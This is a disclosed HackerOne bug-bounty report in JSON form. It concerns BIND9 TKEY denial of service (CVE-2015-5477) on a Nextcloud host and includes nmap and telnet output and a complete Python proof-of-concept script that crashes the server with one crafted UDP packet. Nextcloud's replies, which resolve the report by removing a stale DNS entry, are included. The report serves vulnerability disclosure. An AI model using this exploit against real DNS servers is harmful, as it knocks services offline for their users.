{"id":237860,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzc4NjA=","url":"https://hackerone.com/reports/237860","title":"ci.nextcloud.com: CVE-2015-5477 BIND9 TKEY Vulnerability + Exploit (Denial of Service)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-06-07T23:28:05.817Z","submitted_at":"2017-06-07T23:28:05.817Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"45h","url":"/45h","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/x1czrGhE26qPdPAFHYRYRTbQ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-06-08T17:51:14.229Z","bug_reporter_agreed_on_going_public_at":"2017-06-08T17:51:14.166Z","team_member_agreed_on_going_public_at":"2017-06-08T17:49:33.852Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello Team NextCloud,\n\nIn reference report #217381\nI've reported the DDOS attack via DNS Port at OwnCloud..\nAnd it was successfully patched.\n\nBut now same issue I got at\n\n```\nci.nextcloud.com\n```\nProof Of Concept:\nHere it is the nmap result of ci.nextcloud.com\n\nNMap Scan Results:\n```\nStarting Nmap 7.40 ( https://nmap.org ) at 2017-06-08 04:12 PKT\nNmap scan report for ci.nextcloud.com (█████)\nHost is up (0.077s latency).\nrDNS record for █████████: ███████\nNot shown: 96 filtered ports\nPORT    STATE SERVICE    VERSION\n22/tcp  open  tcpwrapped\n53/tcp  open  tcpwrapped\n80/tcp  open  tcpwrapped\n443/tcp open  tcpwrapped\n```\nNow here it is the telnet result:\n```\n──╼ $telnet\ntelnet\u003e open\n(to) ci.nextcloud.com 53\nTrying ███...\nConnected to ci.nextcloud.com.\nEscape character is '^]'.\n```\n\nSo this can leads to a serious DDOS attack at doc.owncloud.com using the exploit..\n\nExploit Link:\n\n```\nhttps://github.com/elceef/tkeypoc/\n```\nVulnerability Reference CVE Details:\n\n```\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5477\n```\nExploit PoC:\n\nExploit Title: PoC for BIND9 TKEY DoS\n\nExploit Author: elceef\n\nSoftware Link: https://github.com/elceef/tkeypoc/\n\nVersion: ISC BIND 9\n\nTested on: multiple\n\nCVE : CVE-2015-5477\n\n```\n!/usr/bin/env python\n\nimport socket\nimport sys\n\nprint('CVE-2015-5477 BIND9 TKEY PoC')\n\nif len(sys.argv) \u003c 2:\nprint('Usage: ' + sys.argv[0] + ' [target]')\nsys.exit(1)\n\nprint('Sending packet to ' + sys.argv[1] + ' ...')\n\npayload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.sendto(payload, (sys.argv[1], 53))\n\nprint('Done.')\n```\n\nThanks :)\n","vulnerability_information_html":"\u003cp\u003eHello Team NextCloud,\u003c/p\u003e\n\n\u003cp\u003eIn reference report \u003ca href=\"/reports/217381\"\u003e#217381\u003c/a\u003e\u003cbr\u003e\nI\u0026#39;ve reported the DDOS attack via DNS Port at OwnCloud..\u003cbr\u003e\nAnd it was successfully patched.\u003c/p\u003e\n\n\u003cp\u003eBut now same issue I got at\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eci.nextcloud.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eProof Of Concept:\u003cbr\u003e\nHere it is the nmap result of ci.nextcloud.com\u003c/p\u003e\n\n\u003cp\u003eNMap Scan Results:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eStarting Nmap 7.40 ( https://nmap.org ) at 2017-06-08 04:12 PKT\nNmap scan report for ci.nextcloud.com (█████)\nHost is up (0.077s latency).\nrDNS record for █████████: ███████\nNot shown: 96 filtered ports\nPORT    STATE SERVICE    VERSION\n22/tcp  open  tcpwrapped\n53/tcp  open  tcpwrapped\n80/tcp  open  tcpwrapped\n443/tcp open  tcpwrapped\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow here it is the telnet result:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e──╼ $telnet\ntelnet\u0026gt; open\n(to) ci.nextcloud.com 53\nTrying ███...\nConnected to ci.nextcloud.com.\nEscape character is \u0026#39;^]\u0026#39;.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo this can leads to a serious DDOS attack at doc.owncloud.com using the exploit..\u003c/p\u003e\n\n\u003cp\u003eExploit Link:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://github.com/elceef/tkeypoc/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eVulnerability Reference CVE Details:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5477\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eExploit PoC:\u003c/p\u003e\n\n\u003cp\u003eExploit Title: PoC for BIND9 TKEY DoS\u003c/p\u003e\n\n\u003cp\u003eExploit Author: elceef\u003c/p\u003e\n\n\u003cp\u003eSoftware Link: \u003ca title=\"https://github.com/elceef/tkeypoc/\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Felceef%2Ftkeypoc%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/elceef/tkeypoc/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eVersion: ISC BIND 9\u003c/p\u003e\n\n\u003cp\u003eTested on: multiple\u003c/p\u003e\n\n\u003cp\u003eCVE : CVE-2015-5477\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e!/usr/bin/env python\n\nimport socket\nimport sys\n\nprint(\u0026#39;CVE-2015-5477 BIND9 TKEY PoC\u0026#39;)\n\nif len(sys.argv) \u0026lt; 2:\nprint(\u0026#39;Usage: \u0026#39; + sys.argv[0] + \u0026#39; [target]\u0026#39;)\nsys.exit(1)\n\nprint(\u0026#39;Sending packet to \u0026#39; + sys.argv[1] + \u0026#39; ...\u0026#39;)\n\npayload = bytearray(\u0026#39;4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41\u0026#39;.replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;).decode(\u0026#39;hex\u0026#39;))\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.sendto(payload, (sys.argv[1], 53))\n\nprint(\u0026#39;Done.\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThanks :)\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-07-08T17:49:33.907Z","allow_singular_disclosure_after":-109682257.72733116,"singular_disclosure_allowed":true,"vote_count":2,"voters":["003random","spetr0x"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1739930,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2017-06-07T23:28:05.944Z","updated_at":"2017-06-07T23:28:05.944Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1741548,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"ci.nextcloud.com seems to be a DNS entry pointing to a legacy system not anymore in use. I'll make sure this DNS entry gets removed. Thanks for your report.","markdown_message":"\u003cp\u003eci.nextcloud.com seems to be a DNS entry pointing to a legacy system not anymore in use. I\u0026#39;ll make sure this DNS entry gets removed. Thanks for your report.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-08T15:25:27.909Z","updated_at":"2017-06-08T15:25:27.909Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1741551,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"As per our policy issues within our infrastructure are out of scope for monetary bounties at the moment.","markdown_message":"\u003cp\u003eAs per our policy issues within our infrastructure are out of scope for monetary bounties at the moment.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-08T15:26:03.683Z","updated_at":"2017-06-08T15:26:03.683Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1741557,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure, its ok for bounty..\nThanks for positive response :)","markdown_message":"\u003cp\u003eSure, its ok for bounty..\u003cbr\u003e\nThanks for positive response :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-08T15:28:08.018Z","updated_at":"2017-06-08T15:28:08.018Z","actor":{"username":"45h","cleared":false,"url":"/45h","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/x1czrGhE26qPdPAFHYRYRTbQ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1742187,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"As ci.nextcloud.com was pointing to an outdated IP address we have removed this entry now from our DNS server.","markdown_message":"\u003cp\u003eAs ci.nextcloud.com was pointing to an outdated IP address we have removed this entry now from our DNS server.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-08T17:49:28.793Z","updated_at":"2017-06-08T17:49:28.793Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"45h","url":"/45h"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1742188,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-08T17:49:33.874Z","updated_at":"2017-06-08T17:49:33.874Z","first_to_agree":true,"actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1742195,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-08T17:51:14.190Z","updated_at":"2017-06-08T17:51:14.190Z","actor":{"username":"45h","cleared":false,"url":"/45h","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/x1czrGhE26qPdPAFHYRYRTbQ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1742196,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-08T17:51:14.243Z","updated_at":"2017-06-08T17:51:14.243Z","actor":{"username":"45h","cleared":false,"url":"/45h","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/x1czrGhE26qPdPAFHYRYRTbQ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}